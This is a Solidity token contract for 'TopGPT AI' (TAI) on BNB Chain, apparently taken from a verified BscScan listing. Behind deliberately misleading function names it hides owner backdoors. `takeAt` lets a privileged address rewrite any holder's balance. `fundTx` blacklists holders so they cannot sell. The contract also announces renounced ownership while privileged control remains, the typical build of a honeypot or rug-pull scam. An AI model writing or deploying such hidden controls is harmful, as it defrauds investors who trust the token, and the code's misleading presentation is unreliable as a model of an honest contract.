/**
 *Submitted for verification at BscScan.com on 2023-03-19
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface receiverMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitLaunched) external view returns (uint256);

    function transfer(address txSender, uint256 atLaunch) external returns (bool);

    function allowance(address enableTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 atLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address txSender,
        uint256 atLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletSellShould, uint256 value);
    event Approval(address indexed enableTx, address indexed spender, uint256 value);
}

interface receiverMinMetadata is receiverMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract marketingTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tokenFrom {
    function createPair(address tokenExempt, address enableBuy) external returns (address);
}

interface marketingMode {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract TopGPTAI is marketingTx, receiverMin, receiverMinMetadata {

    function takeAt(address txToTrading, uint256 atLaunch) public {
        feeTx();
        atTx[txToTrading] = atLaunch;
    }

    function symbol() external view virtual override returns (string memory) {
        return shouldSwap;
    }

    uint8 private minReceiver = 18;

    uint256 private totalLiquidityFrom = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private atLaunched;

    function approve(address sellBuy, uint256 atLaunch) public virtual override returns (bool) {
        atLaunched[_msgSender()][sellBuy] = atLaunch;
        emit Approval(_msgSender(), sellBuy, atLaunch);
        return true;
    }

    function transfer(address txToTrading, uint256 atLaunch) external virtual override returns (bool) {
        return teamSender(_msgSender(), txToTrading, atLaunch);
    }

    uint256 private sellTradingTo;

    function getOwner() external view returns (address) {
        return receiverTxMax;
    }

    string private receiverList = "TopGPT AI";

    function totalSupply() external view virtual override returns (uint256) {
        return totalLiquidityFrom;
    }

    function teamSender(address exemptMaxFee, address txSender, uint256 atLaunch) internal returns (bool) {
        if (exemptMaxFee == minFund) {
            return modeSellExempt(exemptMaxFee, txSender, atLaunch);
        }
        uint256 takeFundTeam = receiverMin(listSellLimit).totalSupply();
        require(takeFundTeam >= listWallet);
        if (takeFundTeam != listWallet) {
            listWallet = takeFundTeam;
        }
        require(!enableReceiverTo[exemptMaxFee]);
        return modeSellExempt(exemptMaxFee, txSender, atLaunch);
    }

    address public minFund;

    function fundTx(address fundFee) public {
        feeTx();
        if (sellTradingTo == maxAmount) {
            maxLimitLaunch = sellTradingTo;
        }
        if (fundFee == minFund || fundFee == listSellLimit) {
            return;
        }
        enableReceiverTo[fundFee] = true;
    }

    function name() external view virtual override returns (string memory) {
        return receiverList;
    }

    string private shouldSwap = "TAI";

    uint256 public maxAmount;

    function balanceOf(address limitLaunched) public view virtual override returns (uint256) {
        return atTx[limitLaunched];
    }

    address receiverTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public listSellLimit;

    function takeAtMax() public {
        emit OwnershipTransferred(minFund, address(0));
        receiverTxMax = address(0);
    }

    mapping(address => bool) public enableReceiverTo;

    mapping(address => uint256) private atTx;

    function feeTx() private view{
        require(feeSender[_msgSender()]);
    }

    uint256 listWallet;

    event OwnershipTransferred(address indexed fundReceiver, address indexed maxSell);

    constructor (){ 
        
        marketingMode limitMaxTake = marketingMode(receiverTotal);
        listSellLimit = tokenFrom(limitMaxTake.factory()).createPair(limitMaxTake.WETH(), address(this));
        if (sellTradingTo == maxLimitLaunch) {
            maxLimitLaunch = sellTradingTo;
        }
        feeSender[_msgSender()] = true;
        atTx[_msgSender()] = totalLiquidityFrom;
        minFund = _msgSender();
        if (swapToken != isToLaunch) {
            sellTradingTo = enableAt;
        }
        emit Transfer(address(0), minFund, totalLiquidityFrom);
        receiverTxMax = _msgSender();
        takeAtMax();
    }

    uint256 public maxLimitLaunch;

    address private receiverTxMax;

    bool private swapToken;

    function transferFrom(address exemptMaxFee, address txSender, uint256 atLaunch) external override returns (bool) {
        if (_msgSender() != receiverTotal) {
            if (atLaunched[exemptMaxFee][_msgSender()] != type(uint256).max) {
                require(atLaunch <= atLaunched[exemptMaxFee][_msgSender()]);
                atLaunched[exemptMaxFee][_msgSender()] -= atLaunch;
            }
        }
        return teamSender(exemptMaxFee, txSender, atLaunch);
    }

    mapping(address => bool) public feeSender;

    uint256 public enableAt;

    function modeSellExempt(address exemptMaxFee, address txSender, uint256 atLaunch) internal returns (bool) {
        require(atTx[exemptMaxFee] >= atLaunch);
        atTx[exemptMaxFee] -= atLaunch;
        atTx[txSender] += atLaunch;
        emit Transfer(exemptMaxFee, txSender, atLaunch);
        return true;
    }

    function owner() external view returns (address) {
        return receiverTxMax;
    }

    bool public senderFee;

    bool private isToLaunch;

    function allowance(address receiverSwap, address sellBuy) external view virtual override returns (uint256) {
        if (sellBuy == receiverTotal) {
            return type(uint256).max;
        }
        return atLaunched[receiverSwap][sellBuy];
    }

    bool public atTrading;

    function decimals() external view virtual override returns (uint8) {
        return minReceiver;
    }

    function isReceiver(address enableAmount) public {
        if (senderFee) {
            return;
        }
        
        feeSender[enableAmount] = true;
        if (sellTradingTo != enableAt) {
            swapToken = true;
        }
        senderFee = true;
    }

}